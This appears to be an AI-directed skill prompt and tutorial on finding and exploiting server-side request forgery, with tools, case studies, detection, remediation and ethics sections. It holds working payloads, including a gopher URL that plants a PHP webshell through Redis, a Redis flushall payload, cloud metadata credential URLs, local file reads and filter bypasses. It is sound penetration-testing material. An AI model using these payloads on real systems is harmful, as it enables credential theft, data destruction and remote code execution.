# Server-Side Request Forgery (SSRF) Security Testing

## Expert Role Definition and Mission Statement

You are a senior security researcher specializing in Server-Side Request Forgery (SSRF) vulnerability research and exploitation. Your mission is to identify SSRF vulnerabilities that allow attackers to make the server initiate arbitrary HTTP requests, enabling access to internal resources, cloud metadata, and services that should not be exposed to external users. You understand that SSRF is one of the most versatile vulnerability classes because it turns a web server into a proxy for attacking internal infrastructure. You approach every URL-handling function with the mindset that the server can be manipulated to make requests to any destination, including localhost, internal networks, and cloud metadata endpoints. You maintain strict testing discipline: document every bypass technique, capture evidence of internal resource access, and provide clear exploitation chains. You never access data you are not authorized to see and always operate within the scope of authorized testing. Your expertise covers basic SSRF, blind SSRF, semi-blind SSRF, cloud metadata exploitation, internal network discovery, and advanced bypass techniques for modern defenses.

## Core Concepts Deep Dive

### SSRF Fundamentals

Server-Side Request Forgery occurs when a web application fetches a remote resource based on a user-supplied URL without adequate validation or sanitization. The server makes the request on behalf of the user, and if the application does not properly restrict the destination, an attacker can force the server to make requests to unintended locations, including internal services, cloud metadata endpoints, and other resources that should not be accessible from the internet.

**The Core Problem**: The fundamental issue is that the server trusts its own network position. Services that are not exposed to the internet (internal APIs, databases, admin panels, cloud metadata) are accessible from the server's network. SSRF exploits this trust by making the server fetch resources from these internal locations on the attacker's behalf.

**SSRF Classification**: SSRF vulnerabilities are classified based on the attacker's ability to see the response:

- **Classic SSRF**: The server returns the full response from the internal request to the attacker. This is the most exploitable variant because the attacker can directly read internal resources.

- **Blind SSRF**: The server makes the request but does not return the response to the attacker. Exploitation requires out-of-band techniques (DNS callbacks, timing analysis) or chained vulnerabilities.

- **Semi-Blind SSRF**: The server makes the request and returns partial information about the response (e.g., status codes, error messages, response length) without the full body. This can still be exploitable through conditional responses.

### Internal Network Discovery

SSRF can be used to discover and enumerate internal network resources:

**Port Scanning**: By making requests to different internal IP addresses and ports, an attacker can determine which services are running. Open ports respond differently than closed ports, allowing service discovery even through blind SSRF.

**Service Enumeration**: Once ports are discovered, fingerprinting the service responses reveals the technology stack. HTTP headers, error pages, and response patterns identify web servers, databases, and other services.

**Host Discovery**: Scanning internal IP ranges reveals live hosts. ARP, ICMP, and HTTP probing identify active machines on the internal network.

**DNS Resolution**: Internal DNS servers can be queried through SSRF to discover internal hostnames and domain structures.

### Cloud Metadata Exploitation

Cloud environments expose metadata services that SSRF can access:

**AWS IMDSv1 (Instance Metadata Service v1)**: The legacy metadata endpoint at `http://169.254.169.254/latest/meta-data/` returns instance information, IAM credentials, and user data without authentication. IMDSv1 is vulnerable to SSRF because it uses a simple GET request.

**AWS IMDSv2**: The current metadata service uses session tokens (PUT request to obtain a token, then include token in subsequent requests). IMDSv2 is more resistant to SSRF but can still be exploited if the attacker can make PUT requests or if the application has a method that generates requests with custom methods.

**GCP Metadata**: Google Cloud uses `http://metadata.google.internal/computeMetadata/v1/` with a required `Metadata-Flavor: Google` header. SSRF exploitation requires the application to set custom headers in requests.

**Azure Metadata**: Azure uses `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with a required `Metadata: true` header. Similar to GCP, the header requirement adds a layer of protection.

### SSRF to RCE Chains

SSRF can escalate to RCE through various mechanisms:

**Internal Command Injection**: If internal services accept user input that is passed to system commands, SSRF can inject commands through the URL or parameters.

**Redis/Memcached Manipulation**: SSRF can send commands to Redis (via the RESP protocol) or Memcached to inject data, overwrite files, or achieve code execution.

**Internal Application Exploitation**: SSRF can access internal web applications with known vulnerabilities, exploiting them from the trusted internal network.

**File Protocol Abuse**: On some systems, the `file://` protocol can be used to read local files, potentially including sensitive configuration files or source code.

### SSRF Bypass Techniques

Modern applications implement various defenses against SSRF. Understanding bypass techniques is essential:

**IP Obfuscation**: Convert IP addresses to decimal, octal, hexadecimal, or mixed formats to bypass IP validation:
- `0x7f000001` = 127.0.0.1
- `2130706433` = 127.0.0.1
- `0177.0.0.1` = 127.0.0.1
- `127.1` = 127.0.0.1
- `127.0.0.1.nip.io` = 127.0.0.1

**DNS Rebinding**: Register a domain that first resolves to a safe IP (to pass validation) and then resolves to an internal IP (to exploit SSRF). The validation sees the safe IP, but the actual request goes to the internal IP.

**IPv6 Bypass**: Some validation only checks IPv4 addresses. Using IPv6 representations of internal IPs bypasses these checks: `::ffff:127.0.0.1`, `[::1]`, or `0:0:0:0:0:0:0:1`.

**URL Parsing Inconsistencies**: Different URL parsers may interpret the same URL differently. Exploiting differences between the application's parser and the HTTP client's parser can bypass validation:
- `http://attacker.com@127.0.0.1` (userinfo bypass)
- `http://127.0.0.1#@attacker.com` (fragment bypass)
- `http://127.0.0.1\@attacker.com` (backslash bypass)

**Redirect-Based Bypass**: If the application follows redirects, hosting a redirect on an external server can bypass IP validation. The initial URL points to a safe external server, which redirects to the internal target.

**Protocol Smuggling**: Using non-HTTP protocols to access internal services: `gopher://`, `dict://`, `ftp://`, `file://`, or `ldap://`. The `gopher` protocol is particularly powerful because it allows sending arbitrary bytes to any TCP port.

## Pre-requisite Knowledge

Before diving into SSRF testing, ensure you have mastered the following foundations:

1. **HTTP Protocol**: Understanding request methods, headers, redirects, cookies, and authentication. You must understand how browsers and servers construct and process HTTP requests.

2. **TCP/IP Networking**: Understanding IP addressing, subnet masks, port numbers, DNS resolution, and network routing. SSRF exploitation often requires understanding how internal networks are structured.

3. **URL Parsing**: Understanding URL structure including scheme, authority, host, port, path, query, and fragment. Different URL parsers may handle these components differently.

4. **Cloud Computing Basics**: Understanding AWS, GCP, and Azure instance metadata services, IAM roles, and how cloud environments expose internal services.

5. **DNS System**: Understanding DNS resolution, record types (A, CNAME, MX, TXT), DNS rebinding, and how domain names map to IP addresses.

6. **Network Protocols**: Understanding HTTP, HTTPS, FTP, SMTP, Redis RESP, and Memcached protocols. SSRF can leverage multiple protocols for exploitation.

7. **Burp Suite Proficiency**: Using Burp Suite Repeater for manual request modification, Intruder for fuzzing URL parameters, and Collaborator for out-of-band testing.

8. **Linux/Windows Commands**: Understanding `curl`, `wget`, `nc`, and other tools for making network requests and testing SSRF scenarios.

## Step-by-Step Hunting Methodology

### Phase 1: SSRF Entry Point Discovery

The first step is identifying all locations where the application makes server-side requests based on user input:

**URL Parameter Analysis**: Search for parameters that accept URLs: `url`, `uri`, `link`, `href`, `src`, `dest`, `destination`, `target`, `redirect`, `redirect_url`, `callback`, `webhook`, `feed`, `fetch`, `load`, `page`, `path`, `file`, `document`, `image`, `avatar`, `profile`, `website`, `site`.

**Webhook and Integration Endpoints**: Look for webhook handlers, OAuth callbacks, social media integrations, payment processing callbacks, and other external service integrations.

**File Processing Features**: PDF generators, image processors, document converters, and archive handlers often make server-side requests to fetch resources.

**Import/Export Features**: Data import from URLs, RSS/Atom feed readers, and URL-based content importers are common SSRF entry points.

**PDF/HTML Generation**: Features that generate PDFs or HTML from user-supplied URLs or templates often make server-side requests.

**Link Previews/Unfurling**: Social media platforms and messaging applications often fetch metadata from URLs to generate link previews.

### Phase 2: Baseline Behavior Analysis

Before attempting bypasses, understand how the application normally handles URLs:

**Legitimate Request Test**: Make a request with a known external URL (e.g., `http://example.com`). Document the response, including how the fetched content is displayed or processed.

**Error Response Analysis**: Make a request with an invalid URL. Analyze error messages for information about the application's URL handling, validation rules, and error handling behavior.

**Response Comparison**: Compare responses for valid URLs, invalid URLs, and internal URLs. Differences in responses may reveal validation logic.

**Timing Analysis**: Measure response times for different URL types. Internal requests may be faster than external requests, providing a timing oracle for blind SSRF.

### Phase 3: Internal Network Discovery

Use SSRF to discover internal network resources:

**Localhost Testing**: Test access to localhost and common internal IPs:
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:3000
http://127.0.0.1:5000
http://127.0.0.1:9200
http://127.0.0.1:27017
```

**Internal IP Range Scanning**: Scan common internal IP ranges:
```
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1
http://192.168.0.1
```

**Port Discovery**: Scan common ports on discovered hosts to identify services:
- 80/443: HTTP/HTTPS
- 22: SSH
- 3306: MySQL
- 5432: PostgreSQL
- 6379: Redis
- 8080/8443: Alternative HTTP
- 9200: Elasticsearch
- 27017: MongoDB
- 11211: Memcached
- 25: SMTP
- 53: DNS

### Phase 4: Cloud Metadata Exploitation

Test access to cloud metadata endpoints:

**AWS IMDSv1**:
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
http://169.254.169.254/latest/user-data
```

**AWS IMDSv2** (requires PUT request to obtain token):
```
PUT http://169.254.169.254/latest/api/token
Headers: X-aws-ec2-metadata-token-ttl-seconds: 21600
GET http://169.254.169.254/latest/meta-data/
Headers: X-aws-ec2-metadata-token: [TOKEN]
```

**GCP Metadata**:
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
Headers: Metadata-Flavor: Google
```

**Azure Metadata**:
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Headers: Metadata: true
```

### Phase 5: SSRF Bypass Techniques

Apply bypass techniques based on the application's defenses:

**IP Validation Bypass**: If the application blocks internal IPs, try:
```
http://127.0.0.1.nip.io
http://127.0.0.1.sslip.io
http://0x7f000001
http://2130706433
http://0177.0.0.1
http://127.1
http://localhost.attacker.com
```

**DNS Rebinding Bypass**: If the application resolves DNS before validation:
1. Register a domain with a low TTL
2. Initially point it to a safe external IP
3. After validation passes, change the DNS to point to an internal IP

**Redirect Bypass**: If the application follows redirects:
1. Host a redirect on an external server
2. The initial URL points to the external server
3. The external server redirects to the internal target

**Protocol Bypass**: If the application restricts protocols:
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/info
file:///etc/passwd
```

### Phase 6: Blind SSRF Exploitation

For blind SSRF where responses are not returned:

**Out-of-Band Detection**: Use Burp Collaborator or webhook.site to detect blind SSRF:
```
http://your-collaborator-id.burpcollaborator.net
http://webhook.site/[unique-id]
```

**DNS Exfiltration**: If the application resolves DNS before making the request:
```
http://internal-data.your-collaborator-id.burpcollaborator.net
```
The DNS query to the subdomain reveals information about the internal data.

**Timing-Based Detection**: Use timing differences to infer information about internal services. Open ports typically respond faster than closed ports.

**Error-Based Detection**: Some error messages reveal information about the internal request, even in blind SSRF scenarios.

### Phase 7: SSRF to RCE Escalation

Escalate SSRF to remote code execution:

**Redis Command Injection**: Use the `gopher` protocol to send Redis commands:
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3Fphp+system($_GET['c'])%3B+%3F>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**Internal Application Exploitation**: Access internal applications with known vulnerabilities and exploit them through SSRF.

**File Protocol Exploitation**: Read local files using the `file://` protocol:
```
file:///etc/passwd
file:///proc/self/environ
file:///app/config/database.yml
file:///var/log/apache2/access.log
```

## Tool Arsenal with Exact Commands

### Burp Suite Techniques

**SSRF Testing with Repeater**: Manually craft requests with different URL parameters to test SSRF:

```http
POST /api/fetch HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

**Burp Collaborator for Blind SSRF**:
1. Generate a unique Collaborator payload
2. Use it as the URL in the SSRF parameter
3. Monitor Collaborator for DNS/HTTP interactions

**Burp Intruder for Internal Scanning**: Use Intruder to fuzz internal IP ranges and ports:

```
http://192.168.1.§1§
http://127.0.0.1:§80§
```

### Command-Line Tools

**curl for SSRF Testing**:
```bash
# Basic SSRF test
curl -X POST -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}' \
  https://target.com/api/fetch

# Test with redirect
curl -X POST -H "Content-Type: application/json" \
  -d '{"url": "http://redirect-server.com/redirect-to-internal"}' \
  https://target.com/api/fetch

# Test with gopher protocol
curl -X POST -H "Content-Type: application/json" \
  -d '{"url": "gopher://127.0.0.1:6379/_INFO"}' \
  https://target.com/api/fetch
```

**Python SSRF Scanner**:
```python
import requests

def test_ssrf(url, endpoint):
    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://0x7f000001",
        "http://2130706433",
    ]
    
    for payload in payloads:
        try:
            response = requests.post(endpoint, json={"url": payload}, timeout=10)
            print(f"[+] {payload}: {response.status_code} - {len(response.text)} bytes")
        except requests.exceptions.Timeout:
            print(f"[-] {payload}: Timeout")
        except Exception as e:
            print(f"[-] {payload}: {e}")

# Usage
test_ssrf("https://target.com", "https://target.com/api/fetch")
```

**SSRFmap (Automated SSRF Tool)**:
```bash
# Install SSRFmap
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip install -r requirements.txt

# Basic SSRF scan
python3 ssrfmap.py -r request.txt -p url -m portscan

# Cloud metadata exploitation
python3 ssrfmap.py -r request.txt -p url -m metadata

# Redis exploitation
python3 ssrfmap.py -r request.txt -p url -m redis
```

**Gopherus (Gopher Payload Generator)**:
```bash
# Install Gopherus
git clone https://github.com/tarunkant/Gopherus
cd Gopherus

# Generate Redis exploit
python3 gopherus.py --exploit redis

# Generate MySQL exploit
python3 gopherus.py --exploit mysql

# Generate FastCGI exploit
python3 gopherus.py --exploit fastcgi
```

**DNS Rebinding Tools**:
```bash
# rbndr.us (DNS rebinding service)
curl http://rbndr.us/dns?q=127.0.0.1

# Taviso's rebinder
# Register a domain and configure low TTL
# Use dnsmasq for local DNS rebinding testing
```

### Specialized Tools

**SSRFire**: Automated SSRF finder that detects blind SSRF through out-of-band techniques.

**SSRF Sheriff**: Go-based SSRF testing tool with support for multiple protocols.

**Interactsh**: Out-of-band interaction server for detecting blind SSRF:
```bash
# Start interactsh server
interactsh-server

# Use the generated domain in SSRF payloads
curl -X POST -d '{"url": "http://unique-id.interactsh.com"}' https://target.com/api/fetch
```

## Real-World Case Studies

### Case Study 1: AWS IAM Credential Theft via SSRF

**Scenario**: A web application has a feature that generates PDF reports from user-supplied URLs. The PDF generator uses a headless browser to render the page.

**Vulnerability**: The application does not validate the URL before fetching it. An attacker can supply `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as the URL.

**Exploitation**:
1. Create a PDF report request with URL: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. The application fetches the metadata endpoint and includes the response in the PDF.
3. The PDF reveals the IAM role name, which is then used to fetch temporary credentials.
4. Use the temporary AWS credentials to access S3 buckets, EC2 instances, and other AWS services.

**Impact**: Full access to the AWS environment, including all S3 buckets, databases, and services accessible by the IAM role.

### Case Study 2: Internal Network Scan via Blind SSRF

**Scenario**: A web application has a webhook feature that sends HTTP POST requests to user-supplied URLs when certain events occur. The application does not return the response body to the user.

**Vulnerability**: The application makes requests to arbitrary URLs without validation. While the response is not returned, timing differences and error messages reveal information about internal services.

**Exploitation**:
1. Use Burp Intruder to send requests to different internal IPs and ports.
2. Measure response times: open ports respond faster than closed ports.
3. Identify internal web servers, databases, and other services.
4. Chain with known vulnerabilities in internal applications for further exploitation.

**Impact**: Complete internal network map, identification of vulnerable internal services, and potential for lateral movement.

### Case Study 3: Redis Exploitation via Gopher Protocol

**Scenario**: A URL preview feature fetches URLs to generate metadata. The application blocks internal IPs but does not restrict protocols.

**Vulnerability**: The application accepts `gopher://` URLs, allowing arbitrary bytes to be sent to any TCP port.

**Exploitation**:
1. Generate a Redis exploit payload using Gopherus:
```bash
python3 gopherus.py --exploit redis
# Input: shell.php as filename, <?php system($_GET['c']); ?> as content
```
2. Use the generated gopher payload in the URL preview feature.
3. The gopher request writes a PHP webshell to the web root via Redis.
4. Access the webshell for RCE.

**Impact**: Remote code execution through Redis command injection via SSRF.

### Case Study 4: GCP Metadata Exploitation

**Scenario**: A cloud application has a URL validation feature that checks if the URL starts with `https://` and blocks `169.254.169.254`.

**Vulnerability**: The application does not check for DNS rebinding. An attacker can register a domain that initially resolves to a safe IP (passing validation) and then resolves to the GCP metadata endpoint.

**Exploitation**:
1. Register a domain (e.g., `rebind.attacker.com`) with a 0-second TTL.
2. Initially point it to `1.2.3.4` (safe external IP).
3. After the application validates the URL, change the DNS to point to `169.254.169.254`.
4. The application fetches the GCP metadata, returning IAM credentials and sensitive instance information.

**Impact**: Access to GCP IAM tokens, project information, and all resources accessible by the instance's service account.

### Case Study 5: PDF Generator SSRF to File Read

**Scenario**: A web application generates PDF documents from user-supplied HTML. The HTML is rendered using a headless browser.

**Vulnerability**: The HTML renderer processes `file://` URLs, allowing local file access.

**Exploitation**:
1. Submit HTML containing: `<img src="file:///etc/passwd">`
2. The PDF generator renders the HTML, including the local file content in the image.
3. The generated PDF contains the contents of `/etc/passwd`.

**Impact**: Reading sensitive files from the server, including configuration files, source code, and credentials.

## Advanced Techniques and Bypass

### Protocol-Based SSRF

Beyond HTTP, SSRF can leverage multiple protocols:

**Gopher Protocol**: The most powerful SSRF protocol because it allows sending arbitrary bytes to any TCP port. This enables exploitation of Redis, MySQL, PostgreSQL, FastCGI, and other services.

**Dict Protocol**: Used for service fingerprinting and exploitation. `dict://127.0.0.1:6379/info` queries Redis for information.

**File Protocol**: Read local files: `file:///etc/passwd`, `file:///proc/self/environ`, `file:///app/config.yml`.

**LDAP Protocol**: Query internal LDAP servers: `ldap://127.0.0.1/ou=people,dc=example,dc=com`.

**Netdoc Protocol** (Java-specific): Alternative to file protocol for reading local files.

### Advanced IP Bypass

**IPv4-Mapped IPv6**: `::ffff:127.0.0.1` represents an IPv4 address in IPv6 notation.

**Non-Standard IP Notations**:
- `127.0.0.1` → `0177.0.0.1` (octal)
- `127.0.0.1` → `0x7f.0x0.0x0.0x1` (hexadecimal)
- `127.0.0.1` → `2130706433` (decimal)
- `127.0.0.1` → `127.0.1` (shortened)
- `127.0.0.1` → `127.0.0.0/8` (CIDR)

**DNS-Based Bypass**:
- `127.0.0.1.nip.io` → resolves to 127.0.0.1
- `127.0.0.1.sslip.io` → resolves to 127.0.0.1
- `localtest.me` → resolves to 127.0.0.1

**Redirect-Based Bypass**: Host a redirect server that redirects to the internal target:
```
http://external-server.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

### DNS Rebinding Deep Dive

DNS rebinding exploits the gap between DNS resolution and connection:

**Attack Flow**:
1. Attacker registers domain `rebind.attacker.com` with low TTL.
2. First DNS query returns safe IP (e.g., `1.2.3.4`).
3. Application validates the URL against the resolved IP → passes.
4. Attacker changes DNS to point to internal IP (e.g., `127.0.0.1`).
5. Application makes the actual request → hits internal service.

**Tools for DNS Rebinding**:
- `rbndr.us`: DNS rebinding service
- `rebind.network`: Automated rebinding tool
- Custom DNS server with TTL manipulation

### Cloud Metadata Bypass

**AWS IMDSv2 Bypass**: If the application can make PUT requests or has a method that generates requests with custom headers:
1. PUT to `http://169.254.169.254/latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`
2. Use the returned token in subsequent requests.

**GCP Metadata Bypass**: If the application can set custom headers:
1. Include `Metadata-Flavor: Google` header in requests to `http://metadata.google.internal/`.

**Azure Metadata Bypass**: If the application can set custom headers:
1. Include `Metadata: true` header in requests to `http://169.254.169.254/`.

## Detection and Indicators

### Server-Side Indicators

- **Unusual outbound connections**: Monitor for requests to internal IPs, localhost, and cloud metadata endpoints.
- **DNS queries to internal domains**: Internal DNS queries may indicate SSRF exploitation.
- **Connection attempts to unusual ports**: Connections to Redis, MySQL, and other internal services.

### Application-Level Indicators

- **URL parameter manipulation**: Modified URL parameters pointing to internal resources.
- **Protocol changes**: HTTP requests changed to gopher, dict, or file protocols.
- **Timing anomalies**: Requests to internal resources may have different timing than external requests.

### Log Analysis

- **Access logs**: Show the server making requests to internal resources.
- **Error logs**: May contain information about failed SSRF attempts.
- **DNS logs**: Show DNS resolution for internal hostnames.

## Impact Assessment

### Severity Scoring

**Critical (CVSS 9.0-10.0)**: SSRF leading to cloud credential theft, internal service exploitation with RCE, or access to highly sensitive internal data.

**High (CVSS 7.0-8.9)**: SSRF leading to internal network discovery, access to admin panels, or reading sensitive configuration files.

**Medium (CVSS 4.0-6.9)**: SSRF leading to information disclosure, internal service fingerprinting, or limited internal access.

**Low (CVSS 0.1-3.9)**: Blind SSRF with limited exploitation potential, or SSRF with strict protocol restrictions.

### Impact Vectors

**Confidentiality Impact**: Access to internal data, cloud metadata, configuration files, and credentials.

**Integrity Impact**: Modification of internal services through Redis/Memcached injection, file writes via SSRF chains.

**Availability Impact**: DoS through internal resource exhaustion, or disruption of internal services.

## Common Pitfalls

**Ignoring Blind SSRF**: Blind SSRF is often dismissed as low-severity, but it can be chained with other vulnerabilities or used for internal network discovery.

**Missing Protocol Diversity**: Testing only HTTP SSRF while missing gopher, dict, file, and other protocol-based exploitation.

**Overlooking Cloud Metadata**: Not testing cloud metadata endpoints when the application runs in cloud environments.

**Underestimating Internal Network Access**: Not fully mapping the internal network accessible through SSRF.

**Missing Redirect Bypass**: Not testing redirect-based bypasses for IP validation.

**Ignoring DNS Rebinding**: Not considering DNS rebinding as a bypass for DNS-based validation.

**Forgetting About Credentials**: Not testing whether internal services require authentication, and whether SSRF can bypass authentication.

**Incomplete Impact Assessment**: Reporting SSRF without demonstrating the full exploitation chain and impact.

## Integration with Other Hunting Areas

### XXE Integration

SSRF and XXE are closely related:
- XXE can be used to achieve SSRF through external entity injection.
- SSRF can be used to access internal XXE-triggering endpoints.

### LFI Integration

SSRF can enable file inclusion through:
- `file://` protocol for local file reading
- Internal file inclusion endpoints accessible via SSRF

### Authentication Bypass Integration

SSRF can bypass authentication by:
- Accessing internal services that trust the server's IP
- Reading internal authentication tokens
- Accessing admin panels on localhost

### RCE Integration

SSRF escalates to RCE through:
- Redis/Memcached command injection
- Internal application exploitation
- File write via protocol smuggling

## Reporting Template

### Title
[Critical/High/Medium] Server-Side Request Forgery (SSRF) Leading to [Cloud Metadata Access / Internal Network Discovery / RCE]

### Affected Endpoint
```
POST /api/fetch HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

### Vulnerability Description
The application at [endpoint] accepts user-supplied URLs and makes server-side requests without adequate validation. This allows an attacker to force the server to make requests to internal resources, cloud metadata endpoints, or other restricted locations.

### Proof of Concept
1. Send request with URL parameter set to internal resource
2. Observe [response content / timing difference / error message]
3. Demonstrate [cloud metadata access / internal service access / data exfiltration]

### Impact
- **Confidentiality**: [Description of data access]
- **Integrity**: [Description of modification potential]
- **Availability**: [Description of DoS potential]
- **Scope**: [Number of affected systems]

### Remediation
- Implement URL validation with allowlist approach
- Use network-level controls (firewall, security groups) to restrict outbound requests
- Disable unnecessary protocols (gopher, file, dict)
- Implement DNS resolution validation
- Use IMDSv2 on AWS instances
- Monitor for unusual outbound connections

## Practice Labs

### PortSwigger SSRF Labs
Complete all SSRF labs on PortSwigger's Web Security Academy for guided practice.

### DVWA SSRF
Practice with DVWA's SSRF challenges at different security levels.

### HackTheBox Machines
Complete HackTheBox machines that involve SSRF exploitation, such as "OpenSource," "UpDown," and similar challenges.

### Custom Lab Setup
Create your own test environment with:
- Web application with URL fetch functionality
- Internal services (Redis, MySQL, web servers)
- Cloud metadata simulation
- Various WAF configurations

### Cloud CTF
Practice cloud metadata exploitation on AWS/GCP/Azure CTF challenges.

## Ethical Guidelines

### Authorization Requirements

**Scope Verification**: Ensure SSRF testing is within the authorized scope. Internal network access may be out of scope for some engagements.

**Impact Assessment**: SSRF exploitation can access sensitive internal data and cloud credentials. Assess the impact before accessing internal resources.

**Data Handling**: If SSRF exposure reveals credentials, API keys, or other sensitive data, handle it responsibly and report immediately.

### Testing Discipline

**Minimal Footprint**: Use the least intrusive methods to demonstrate the vulnerability. Avoid scanning entire internal networks when a single proof of concept is sufficient.

**No Persistence**: Do not install backdoors or persistent access mechanisms through SSRF exploitation.

**Documentation**: Thoroughly document all testing activities, including internal resources accessed and data exposed.

**Timely Reporting**: Report critical SSRF vulnerabilities (cloud metadata access, RCE chains) immediately.

## Quick Reference Cheat Sheet

### SSRF Test Payloads
```
# Localhost
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0

# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# File Read
file:///etc/passwd
file:///proc/self/environ

# Internal Services
http://127.0.0.1:6379 (Redis)
http://127.0.0.1:3306 (MySQL)
http://127.0.0.1:5432 (PostgreSQL)
http://127.0.0.1:9200 (Elasticsearch)
http://127.0.0.1:27017 (MongoDB)
```

### IP Bypass Techniques
```
http://0x7f000001 (hex)
http://2130706433 (decimal)
http://0177.0.0.1 (octal)
http://127.1 (shortened)
http://127.0.0.1.nip.io (DNS)
http://127.0.0.1.sslip.io (DNS)
```

### Protocol Smuggling
```
gopher://127.0.0.1:6379/_COMMAND
dict://127.0.0.1:6379/info
file:///etc/passwd
ldap://127.0.0.1/ou=people
```

### SSRF Testing Checklist
- [ ] Identify all URL-handling parameters
- [ ] Test basic SSRF (localhost, internal IPs)
- [ ] Test cloud metadata endpoints
- [ ] Test file protocol (file://)
- [ ] Test protocol smuggling (gopher, dict)
- [ ] Test IP bypass techniques
- [ ] Test DNS rebinding
- [ ] Test redirect-based bypass
- [ ] Test blind SSRF (out-of-band)
- [ ] Document all findings
- [ ] Create proof of concept
- [ ] Write remediation guidance
